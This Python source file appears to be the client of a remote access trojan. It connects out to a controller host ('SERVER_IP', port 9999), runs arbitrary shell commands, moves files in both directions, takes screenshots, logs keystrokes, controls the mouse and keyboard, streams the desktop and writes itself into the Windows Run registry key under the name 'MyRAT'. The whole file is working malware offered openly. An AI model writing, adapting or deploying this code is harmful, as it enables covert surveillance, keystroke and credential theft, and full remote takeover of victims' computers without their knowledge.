import socket
import subprocess
import threading
import os
import sys
import struct
import pyautogui
from io import BytesIO
from pynput import keyboard
import platform
import cv2
import mss
import numpy as np
import time

# Globals for keylogger
keylog = []
keylog_lock = threading.Lock()
keylogger_running = False

# Globals for streaming
streaming_active = False
streaming_lock = threading.Lock()

def reliable_send(s, data):
    length = struct.pack('>I', len(data))
    s.sendall(length + data)

def reliable_recv(s):
    raw_len = recvall(s, 4)
    if not raw_len:
        return None
    length = struct.unpack('>I', raw_len)[0]
    return recvall(s, length)

def recvall(s, n):
    data = b''
    while len(data) < n:
        packet = s.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output
    except subprocess.CalledProcessError as e:
        return e.output

def receive_file(s, filename):
    with open(filename, 'wb') as f:
        while True:
            data = reliable_recv(s)
            if data == b'EOF':
                break
            f.write(data)

def send_file(s, filename):
    with open(filename, 'rb') as f:
        while True:
            bytes_read = f.read(4096)
            if not bytes_read:
                break
            reliable_send(s, bytes_read)
    reliable_send(s, b'EOF')

def capture_screen():
    screenshot = pyautogui.screenshot()
    buf = BytesIO()
    screenshot.save(buf, format='PNG')
    return buf.getvalue()

def on_press(key):
    global keylog
    try:
        with keylog_lock:
            keylog.append(key.char)
    except AttributeError:
        with keylog_lock:
            keylog.append('[' + str(key) + ']')

def start_keylogger():
    global keylogger_running
    keylogger_running = True
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def stop_keylogger():
    global keylogger_running
    keylogger_running = False

def get_keylog():
    global keylog
    with keylog_lock:
        data = ''.join(keylog)
        keylog = []
    return data.encode()

def add_persistence():
    if platform.system() == "Windows":
        try:
            import winreg
            path = sys.executable
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "MyRAT", 0, winreg.REG_SZ, path)
            key.Close()
        except Exception as e:
            pass
    else:
        # For Linux/macOS, add to cron or launch agents (not implemented here)
        pass

def stream_desktop(s):
    global streaming_active
    with mss.mss() as sct:
        while True:
            with streaming_lock:
                if not streaming_active:
                    break

            # Capture screen
            sct_img = sct.grab(sct.monitors[1]) # Capture the primary monitor
            img = np.array(sct_img)
            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR) # Convert to BGR for OpenCV compatibility

            # Encode to JPEG
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 70] # Quality 0-100
            result, frame = cv2.imencode('.jpg', img, encode_param)
            if not result:
                continue

            try:
                reliable_send(s, frame.tobytes())
            except socket.error as e:
                print(f"Socket error during streaming: {e}")
                with streaming_lock:
                    streaming_active = False
                break
            time.sleep(0.05) # Adjust for desired frame rate (e.g. 0.1 for 10 FPS, 0.05 for 20 FPS)

def client():
    server_ip = 'SERVER_IP'  # Replace with your server IP
    server_port = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))

    add_persistence()

    while True:
        command = reliable_recv(s)
        if command is None:
            break
        command = command.decode()

        if command == 'exit':
            break
        elif command.startswith('exec '):
            cmd = command[5:]
            output = execute_command(cmd)
            reliable_send(s, output)
        elif command.startswith('upload '):
            filename = command[7:]
            receive_file(s, filename)
            reliable_send(s, b'Upload complete')
        elif command.startswith('download '):
            filename = command[9:]
            if os.path.exists(filename):
                send_file(s, filename)
            else:
                reliable_send(s, b'File not found')
        elif command == 'screenshot':
            img_data = capture_screen()
            reliable_send(s, img_data)
        elif command == 'keylog_start':
            if not keylogger_running:
                threading.Thread(target=start_keylogger, daemon=True).start()
            reliable_send(s, b'Keylogger started')
        elif command == 'keylog_dump':
            data = get_keylog()
            reliable_send(s, data)
        elif command == 'keylog_stop':
            stop_keylogger()
            reliable_send(s, b'Keylogger stopped')
        elif command.startswith('mouse_move '):
            try:
                x, y = map(int, command.split()[1:3])
                pyautogui.moveTo(x, y)
                reliable_send(s, b'Mouse moved')
            except:
                reliable_send(s, b'Invalid coordinates')
        elif command.startswith('mouse_click'):
            pyautogui.click()
            reliable_send(s, b'Mouse clicked')
        elif command.startswith('type '):
            text = command[5:]
            pyautogui.typewrite(text)
            reliable_send(s, b'Text typed')
        elif command == 'stream_start':
            with streaming_lock:
                if not streaming_active:
                    streaming_active = True
                    threading.Thread(target=stream_desktop, args=(s,), daemon=True).start()
                    reliable_send(s, b'Desktop streaming started')
                else:
                    reliable_send(s, b'Streaming already active')
        elif command == 'stream_stop':
            with streaming_lock:
                if streaming_active:
                    streaming_active = False
                    reliable_send(s, b'Desktop streaming stopped')
                else:
                    reliable_send(s, b'Streaming not active')
        else:
            reliable_send(s, b'Unknown command')

    s.close()

if __name__ == '__main__':
    client()
